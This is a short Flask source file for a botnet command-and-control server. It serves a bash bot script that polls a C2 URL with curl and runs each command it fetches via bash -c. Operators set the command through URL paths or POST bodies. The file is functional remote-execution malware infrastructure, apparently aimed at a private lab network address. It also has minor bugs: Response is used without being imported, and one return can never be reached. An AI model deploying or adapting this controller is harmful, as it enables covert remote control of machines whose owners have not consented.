from flask import Flask, request
app = Flask(__name__)

command = "idle"

# Bot payload script - served at /payload
BOT_LOOP_SCRIPT = '''#!/bin/bash
C2_URL="http://172.18.0.2:9000/cmd"
while true; do
    CMD=$(curl -s $C2_URL)
    if [ "$CMD" != "idle" ] && [ ! -z "$CMD" ]; then
        echo "[BOT] Executing: $CMD"
        bash -c "$CMD"
    fi
    sleep 5
done
'''

@app.route("/cmd")
def get_cmd():
    return command

# Simple commands via URL path
@app.route("/set/<cmd>")
def set_cmd(cmd):
    global command
    command = cmd
    return "OK"

# Complex commands via POST body
@app.route("/set", methods=["POST"])
def set_cmd_post():
    global command
    # Preferred: form field cmd=...
    if request.form:
        if "cmd" in request.form:
            command = request.form.get("cmd", "")
            return Response("OK\n", mimetype="text/plain")

        # If user did: curl -d 'ls' ... then request.form == {'ls': ''}
        if len(request.form) == 1:
            command = next(iter(request.form.keys()))
            return Response("OK\n", mimetype="text/plain")

    # Otherwise treat it as raw text body
    command = request.get_data(as_text=True) or ""
    return Response("OK\n", mimetype="text/plain")

    return "OK"

@app.route("/payload")
def get_payload():
    return BOT_LOOP_SCRIPT

app.run(host="0.0.0.0", port=9000)
